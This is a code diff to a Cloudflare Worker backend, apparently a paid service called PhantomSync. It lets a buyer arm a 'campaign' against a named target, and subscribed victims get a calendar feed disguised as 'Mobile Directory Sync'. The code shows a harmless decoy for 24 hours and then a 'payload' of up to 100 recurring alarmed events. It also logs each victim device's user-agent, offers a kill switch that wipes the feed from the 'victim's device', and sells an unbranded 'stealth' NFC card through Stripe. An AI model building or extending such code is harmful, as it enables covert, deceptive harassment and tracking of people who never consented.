@@ -15,6 +15,9 @@ const CORS_HEADERS = {
   "Access-Control-Max-Age": "86400",
 };
 
+// Global in-memory cache for campaigns across warm worker runs (backed by KV if PHANTOM_KV bound)
+const MEMORY_CAMPAIGNS = new Map();
+
 export default {
   async fetch(request, env, ctx) {
     if (request.method === "OPTIONS") {
@@ -29,8 +32,10 @@ export default {
         JSON.stringify({
           status: "online",
           service: "PhantomSync AI Backend",
-          version: "4.0.0 (25 AI Strikes + 1000+ Vault)",
+          version: "4.1.0 (Trojan Horse WebCal + Stripe Checkout + 25 AI Strikes)",
           has_gemini_key: Boolean(env.GEMINI_API_KEY),
+          has_stripe_key: Boolean(env.STRIPE_SECRET_KEY),
+          has_kv_storage: Boolean(env.PHANTOM_KV),
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
@@ -114,6 +119,342 @@ export default {
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
     }
+
+    // Save Campaign Endpoint (Arms campaign for dynamic webcal subscription)
+    if (url.pathname === "/api/campaigns" && request.method === "POST") {
+      const body = await request.json().catch(() => ({}));
+      const {
+        name = "Target",
+        quirks = "",
+        theme = "mixed",
+        delayDays = 14,
+        events = [],
+      } = body;
+
+      if (!events || !events.length) {
+        return new Response(JSON.stringify({ error: "No events provided" }), { status: 400, headers: CORS_HEADERS });
+      }
+
+      const campaignId = "ps_" + Math.random().toString(36).substring(2, 10);
+      const host = url.host;
+      const campaign = {
+        id: campaignId,
+        name,
+        quirks,
+        theme,
+        delayDays,
+        events,
+        createdAt: Date.now(),
+        syncCount: 0,
+        lastSyncAt: null,
+        lastUserAgent: null,
+        killSwitch: false,
+      };
+
+      await saveCampaign(env, campaign);
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId,
+          webcalUrl: `webcal://${host}/cal/${campaignId}.ics`,
+          httpUrl: `https://${host}/cal/${campaignId}.ics`,
+          trojanMode: true,
+          createdAt: campaign.createdAt,
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Dynamic Trojan Horse WebCal Feed Endpoint: /cal/:id.ics or /feed/:id.ics
+    const calMatch = url.pathname.match(/^\/(?:cal|feed)\/([a-zA-Z0-9_-]+)(?:\.ics)?$/);
+    if (calMatch && request.method === "GET") {
+      const campaignId = calMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+
+      if (!campaign) {
+        return new Response("Calendar feed not found or expired.", { status: 404, headers: CORS_HEADERS });
+      }
+
+      // Check remote emergency kill switch
+      if (campaign.killSwitch) {
+        const wipedIcs = formatIcsCalendar({ name: campaign.name, events: [], isWiped: true });
+        return new Response(wipedIcs, {
+          headers: {
+            "Content-Type": "text/calendar; charset=utf-8",
+            "Content-Disposition": `inline; filename="directory-sync.ics"`,
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            ...CORS_HEADERS,
+          },
+        });
+      }
+
+      // Trojan Horse check:
+      // If within 24 hours of creation, serve the DECOY (1 harmless corporate check event)
+      // After 24 hours (or if ?force_live=1), serve the full 100-event payload!
+      const forceLive = url.searchParams.get("force_live") === "1";
+      const hoursElapsed = (Date.now() - (campaign.createdAt || Date.now())) / (1000 * 60 * 60);
+      const isDecoy = !forceLive && (hoursElapsed < 24);
+
+      // Record subscriber telemetry
+      campaign.syncCount = (campaign.syncCount || 0) + 1;
+      campaign.lastSyncAt = new Date().toISOString();
+      campaign.lastUserAgent = request.headers.get("user-agent") || "Unknown Device";
+      await saveCampaign(env, campaign);
+
+      const icsOutput = formatIcsCalendar({
+        name: campaign.name,
+        events: campaign.events,
+        isDecoy: isDecoy,
+      });
+
+      return new Response(icsOutput, {
+        headers: {
+          "Content-Type": "text/calendar; charset=utf-8",
+          "Content-Disposition": `inline; filename="directory-sync.ics"`,
+          "Cache-Control": "no-cache, no-store, must-revalidate",
+          ...CORS_HEADERS,
+        },
+      });
+    }
+
+    // Campaign Status & Telemetry: /api/campaigns/:id/status
+    const statusMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/status$/);
+    if (statusMatch && request.method === "GET") {
+      const campaignId = statusMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+
+      const hoursElapsed = (Date.now() - (campaign.createdAt || Date.now())) / (1000 * 60 * 60);
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId: campaign.id,
+          name: campaign.name,
+          createdAt: campaign.createdAt,
+          hoursElapsed: Math.round(hoursElapsed * 10) / 10,
+          trojanPhase: hoursElapsed < 24 ? "Phase 1: Decoy Active (1 Event)" : "Phase 2: Full Payload Deployed (100 Events)",
+          isDecoy: hoursElapsed < 24,
+          syncCount: campaign.syncCount || 0,
+          lastSyncAt: campaign.lastSyncAt,
+          lastUserAgent: campaign.lastUserAgent,
+          killSwitch: Boolean(campaign.killSwitch),
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Remote Emergency Kill Switch: /api/campaigns/:id/kill-switch
+    const killMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/kill-switch$/);
+    if (killMatch && request.method === "POST") {
+      const campaignId = killMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+
+      campaign.killSwitch = !campaign.killSwitch;
+      await saveCampaign(env, campaign);
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId: campaign.id,
+          killSwitch: campaign.killSwitch,
+          message: campaign.killSwitch
+            ? "Emergency Kill Switch ENGAGED. Calendar feed wiped on victim's device!"
+            : "Emergency Kill Switch disengaged. Feed restored.",
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Stripe Checkout Session Creation: /api/create-checkout-session
+    if (url.pathname === "/api/create-checkout-session" && request.method === "POST") {
+      const body = await request.json().catch(() => ({}));
+      const {
+        plan = "digital",
+        campaignId = "demo",
+        successUrl,
+        cancelUrl,
+      } = body;
+
+      const stripeKey = env.STRIPE_SECRET_KEY;
+      if (!stripeKey) {
+        // Instant Demo Fallback Mode if Stripe is not yet configured
+        return new Response(
+          JSON.stringify({
+            success: true,
+            demo_mode: true,
+            plan,
+            campaignId,
+            message: "Stripe key not configured. Instant Demo Arming activated!",
+          }),
+          { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+        );
+      }
+
+      try {
+        const isPhysical = plan === "physical_card";
+        const amount = isPhysical ? 1499 : 499;
+        const prodName = isPhysical
+          ? "PhantomSync Black Matte NFC Stealth Card"
+          : "PhantomSync Digital Pass (18-Month Sync)";
+        const prodDesc = isPhysical
+          ? "Discrete NFC Card dispatched with zero exterior branding + Trojan Horse dynamic calendar feed."
+          : "Live dynamic webcal feed with 24-hr Trojan Horse decoy delay + Mission Control Telemetry.";
+
+        const params = new URLSearchParams();
+        params.append("mode", "payment");
+        params.append("success_url", successUrl || `${url.origin}/phantomsync_studio.html?armed=1&cid=${campaignId}`);
+        params.append("cancel_url", cancelUrl || `${url.origin}/phantomsync_studio.html`);
+        params.append("payment_method_types[0]", "card");
+
+        params.append("line_items[0][price_data][currency]", "usd");
+        params.append("line_items[0][price_data][unit_amount]", String(amount));
+        params.append("line_items[0][price_data][product_data][name]", prodName);
+        params.append("line_items[0][price_data][product_data][description]", prodDesc);
+        params.append("line_items[0][quantity]", "1");
+
+        params.append("metadata[campaignId]", campaignId);
+        params.append("metadata[plan]", plan);
+
+        if (isPhysical) {
+          params.append("shipping_address_collection[allowed_countries][0]", "US");
+          params.append("shipping_address_collection[allowed_countries][1]", "CA");
+          params.append("shipping_address_collection[allowed_countries][2]", "GB");
+        }
+
+        const stripeRes = await fetch("https://api.stripe.com/v1/checkout/sessions", {
+          method: "POST",
+          headers: {
+            Authorization: `Bearer ${stripeKey}`,
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: params.toString(),
+        });
+
+        if (!stripeRes.ok) {
+          const errText = await stripeRes.text();
+          throw new Error(`Stripe error ${stripeRes.status}: ${errText}`);
+        }
+
+        const session = await stripeRes.json();
+        return new Response(
+          JSON.stringify({ success: true, url: session.url, sessionId: session.id }),
+          { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+        );
+      } catch (err) {
+        return new Response(
+          JSON.stringify({ error: err.message }),
+          { status: 500, headers: CORS_HEADERS }
+        );
+      }
+    }
+
+    return new Response("Not Found", { status: 404, headers: CORS_HEADERS });
+  },
+};
+
+/**
+ * Storage helpers (Cloudflare KV with in-memory fallback)
+ */
+async function saveCampaign(env, campaign) {
+  if (env && env.PHANTOM_KV) {
+    try {
+      await env.PHANTOM_KV.put(`campaign:${campaign.id}`, JSON.stringify(campaign), {
+        expirationTtl: 86400 * 600, // 600 days
+      });
+    } catch (e) {
+      console.warn("KV put failed, falling back to memory:", e.message);
+    }
+  }
+  MEMORY_CAMPAIGNS.set(campaign.id, campaign);
+}
+
+async function getCampaign(env, id) {
+  if (env && env.PHANTOM_KV) {
+    try {
+      const raw = await env.PHANTOM_KV.get(`campaign:${id}`);
+      if (raw) return JSON.parse(raw);
+    } catch (e) {
+      console.warn("KV get failed, checking memory:", e.message);
+    }
+  }
+  return MEMORY_CAMPAIGNS.get(id) || null;
+}
+
+/**
+ * Generates an RFC-5545 compliant .ics file with Trojan Horse decoy support
+ */
+function formatIcsCalendar({ name, events = [], isDecoy = false, isWiped = false }) {
+  const calName = "Mobile Directory Sync";
+  const calDesc = isWiped ? "Feed Terminated" : "Automated incident & protocol synchronization feed.";
+
+  const lines = [
+    "BEGIN:VCALENDAR",
+    "VERSION:2.0",
+    "PRODID:-//PhantomSync//Incident Protocol Sync//EN",
+    "CALSCALE:GREGORIAN",
+    "METHOD:PUBLISH",
+    `X-WR-CALNAME:${calName}`,
+    `X-WR-CALDESC:${calDesc}`,
+    "X-WR-TIMEZONE:America/Chicago",
+  ];
+
+  if (isWiped) {
+    // Empty calendar wipes all events from victim's phone immediately
+    lines.push("END:VCALENDAR");
+    return lines.join("\r\n");
+  }
+
+  if (isDecoy) {
+    // Trojan Horse Decoy: Exactly 1 boring system event placed 6 months in the future
+    const d = new Date(Date.now() + 180 * 86400 * 1000);
+    const dtStr = d.toISOString().slice(0, 10).replace(/-/g, "");
+    lines.push("BEGIN:VEVENT");
+    lines.push(`UID:decoy-verify-${Date.now()}@phantomsync.io`);
+    lines.push("DTSTAMP:20260101T000000Z");
+    lines.push(`DTSTART;VALUE=DATE:${dtStr}`);
+    lines.push(`DTEND;VALUE=DATE:${dtStr}`);
+    lines.push("SUMMARY:📱 Enterprise Directory Verification (Active)");
+    lines.push("DESCRIPTION:Mobile device registered to secure directory synchronization. Routine periodic sync active.");
+    lines.push("TRANSP:TRANSPARENT");
+    lines.push("END:VEVENT");
+  } else {
+    // Full 100-event slow-burn schedule
+    events.forEach((ev, idx) => {
+      const dt = new Date(ev.dateObj || Date.now());
+      const dtStr = dt.toISOString().slice(0, 10).replace(/-/g, "");
+      const nextDay = new Date(dt.getTime() + 86400 * 1000);
+      const nextStr = nextDay.toISOString().slice(0, 10).replace(/-/g, "");
+
+      const cleanTitle = (ev.title || "Incident Notification").replace(/[\r\n]+/g, " ");
+      const cleanMemo = (ev.memo || "").replace(/[\r\n]+/g, " ");
+
+      lines.push("BEGIN:VEVENT");
+      lines.push(`UID:phantom-${idx}-${Date.now()}@phantomsync.io`);
+      lines.push("DTSTAMP:20260101T000000Z");
+      lines.push(`DTSTART;VALUE=DATE:${dtStr}`);
+      lines.push(`DTEND;VALUE=DATE:${nextStr}`);
+      lines.push("RRULE:FREQ=YEARLY");
+      lines.push(`SUMMARY:${cleanTitle}`);
+      lines.push(`DESCRIPTION:${cleanMemo}`);
+      lines.push("TRANSP:TRANSPARENT");
+      lines.push("BEGIN:VALARM");
+      lines.push("ACTION:DISPLAY");
+      lines.push(`DESCRIPTION:${cleanTitle}`);
+      lines.push("TRIGGER:-PT9H");
+      lines.push("END:VALARM");
+      lines.push("END:VEVENT");
+    });
+  }
+
+  lines.push("END:VCALENDAR");
+  return lines.join("\r\n");
+}
 
     return new Response("Not Found", { status: 404, headers: CORS_HEADERS });
   },
